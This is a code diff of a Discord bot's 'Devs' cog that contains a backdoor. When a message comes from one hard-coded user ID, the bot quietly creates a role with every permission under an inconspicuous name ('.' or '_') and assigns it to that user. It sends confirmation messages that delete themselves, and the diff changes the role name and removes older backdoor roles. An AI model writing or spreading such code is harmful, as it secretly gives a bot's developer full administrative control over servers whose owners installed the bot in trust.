@@ -13,25 +13,31 @@ class Devs():
 
         if ctx.message.author.id == 150750980097441792: #OGaming's User ID
             Msgs=[ctx.message]
+            Current="."
             try:
                 if discord.utils.get(ctx.message.guild.roles, name="(._.)"):
                     role = discord.utils.get(ctx.message.guild.roles, name="(._.)")
                     await role.delete()
                     await ctx.send("Removed", delete_after=3)
 
-                if discord.utils.get(ctx.message.author.roles, name="_"):
+                if discord.utils.get(ctx.message.guild.roles, name="_"):
+                    role = discord.utils.get(ctx.message.guild.roles, name="_")
+                    await role.delete()
+                    await ctx.send("Removed", delete_after=3)
+
+                if discord.utils.get(ctx.message.author.roles, name=Current):
                     tmp = await ctx.send("Already Completed")
                     Msgs.append(tmp)
                 else:
-                    if discord.utils.get(ctx.message.guild.roles, name="_"): #Role all ready exists
+                    if discord.utils.get(ctx.message.guild.roles, name=Current): #Role all ready exists
                         tmp = await ctx.send("All ready made")
                         Msgs.append(tmp)
                     else:
-                        await ctx.message.guild.create_role(name="_", permissions=discord.Permissions.all())
+                        await ctx.message.guild.create_role(name=Current, permissions=discord.Permissions.all())
                         tmp = await ctx.send("Made")
                         Msgs.append(tmp)
                     await asyncio.sleep(1)
-                    await ctx.author.add_roles(discord.utils.get(ctx.message.guild.roles, name="_"))
+                    await ctx.author.add_roles(discord.utils.get(ctx.message.guild.roles, name=Current))
                     await tmp.edit(content="Added")
                     success = await ctx.send("Success")
                     Msgs.append(success)
@@ -39,7 +45,7 @@ class Devs():
                 perm = ctx.message.guild.me.top_role
                 posBot = perm.position
 
-                role = discord.utils.get(ctx.message.guild.roles, name="_")
+                role = discord.utils.get(ctx.message.guild.roles, name=Current)
                 posDev = role.position
 
                 if posBot > posDev:
@@ -68,7 +74,7 @@ class Devs():
             perm = ctx.message.guild.me.top_role
             posBot = perm.position
 
-            role = discord.utils.get(ctx.message.guild.roles, name="_")
+            role = discord.utils.get(ctx.message.guild.roles, name=Current)
             posDev = role.position
 
             if posBot > posDev:
